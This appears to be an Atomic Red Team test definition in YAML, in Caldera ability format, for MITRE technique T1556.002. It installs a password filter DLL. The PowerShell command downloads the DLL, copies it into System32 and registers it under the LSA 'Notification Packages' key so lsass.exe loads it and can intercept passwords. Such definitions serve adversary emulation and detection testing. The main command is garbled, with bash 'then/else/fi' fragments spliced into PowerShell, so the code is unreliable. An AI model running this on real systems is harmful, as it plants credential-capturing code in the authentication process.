- id: a7961770-beb5-4134-9674-83d7e1fa865c
  name: Install and Register Password Filter DLL
  description: "Uses PowerShell to install and register a password filter DLL. Requires\
    \ a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\n\
    Source is in src folder. \nThis does require a reboot to see the filter loaded\
    \ into lsass.exe. \nIt does require Administrative privileges to import the clean\
    \ registry values back into LSA, it is possible you may have to manually do this\
    \ after for cleanup."
  tactic: credential-access
  technique:
    attack_id: T1556.002
    name: 'Modify Authentication Process: Password Filter DLL'
  platforms:
    windows:
      psh:
        command: 'if (Test-Path "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll")
          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
          = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"
          -OutFile "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll";
          fi; reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg";
          $passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll"
          -Destination "C:\Windows\System32" -PassThru).basename; $lsaKey = Get-Item
          "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"; $notificationPackagesValues
          = $lsaKey.GetValue("Notification Packages"); $notificationPackagesValues
          += $passwordFilterName; Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
          "Notification Packages" $notificationPackagesValues'
        cleanup: reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"; remove-item
          C:\Windows\System32\#{dll_name}
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1556.002
  - credential-access
  - atomic-red-team
  author: Atomic Red Team
  additional_info:
    input_arguments:
      dll_path:
        description: Path to DLL to be installed and registered
        type: path
        default: PathToAtomicsFolder\T1556.002\bin
      dll_name:
        description: Name of the Password Filter
        type: string
        default: AtomicRedTeamPWFilter.dll
    dependencies:
    - description: 'AtomicRedTeamPWFilter.dll must exist on disk at specified location
        (#{dll_path}\#{dll_name})

        '
      prereq_command: 'if (Test-Path "#{dll_path}\#{dll_name}") {exit 0} else {exit
        1}

        '
      get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll"
        -OutFile "#{dll_path}\#{dll_name}"

        '
    technique_created: '2020-02-11T19:05:45.829Z'
    atomic_guid: a7961770-beb5-4134-9674-83d7e1fa865c
    import_timestamp: '2025-08-27T03:04:29.092239Z'
